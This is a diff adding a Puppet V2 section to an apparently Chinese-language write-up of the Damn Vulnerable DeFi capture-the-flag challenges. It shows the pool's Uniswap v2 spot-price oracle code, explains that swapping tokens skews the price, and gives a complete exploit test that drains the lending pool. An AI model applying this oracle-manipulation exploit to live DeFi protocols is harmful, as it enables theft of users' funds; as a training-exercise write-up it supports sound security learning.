@@ -1,5 +1,5 @@
 ---
-title: Damn Vulnerable DeFi V3
+title: Damn Vulnerable DeFi V3 / V4
 tags:
     - blockchain
     - smart contract
@@ -1263,3 +1263,59 @@ it('Execution', async function () {
 
 - [Exchange | Uniswap](https://docs.uniswap.org/contracts/v1/reference/exchange)
 - [A Long Way To Go: On Gasless Tokens and ERC20-Permit](https://soliditydeveloper.com/erc20-permit#frontend-usage)
+
+## 9. Puppet V2
+
+> Now they’re using a [Uniswap v2 exchange](https://docs.uniswap.org/contracts/v2/overview) as a price oracle, along with the recommended utility libraries. That should be enough.
+>
+> You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance.
+> 
+> Save all funds from the pool, depositing them into the designated recovery account.
+
+- 借出代币所需 WETH 数量的计算由基于实时余额修改为基于存储的余额
+
+    ```js
+    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
+        uint256 depositFactor = 3;
+        return _getOracleQuote(tokenAmount).mul(depositFactor) / (1 ether);
+    }
+
+    // Fetch the price from Uniswap v2 using the official libraries
+    function _getOracleQuote(uint256 amount) private view returns (uint256) {
+        (uint256 reservesWETH, uint256 reservesToken) =
+            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
+        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);
+    }
+
+    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
+        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
+        require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
+        amountB = amountA.mul(reserveB) / reserveA;
+    }
+    ```
+
+- 因为 `player` 初始持有 10000 DVT，可以先使用 DVT 交换 WETH 以抬高 WETH 的价格，再调用 `borrow()` 清空 `PuppetV2Pool` 的代币
+
+### Exploit
+
+```js
+function test_puppetV2() public checkSolvedByPlayer {
+    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+    address[] memory path = new address[](2);
+    path[0] = address(token);
+    path[1] = address(weth);
+    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        PLAYER_INITIAL_TOKEN_BALANCE,
+        0,
+        path,
+        player,
+        block.timestamp + 60
+    );
+    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+    uint256 amountToBorrow = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+    weth.approve(address(lendingPool), amountToBorrow);
+    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+    token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+}
+```
+
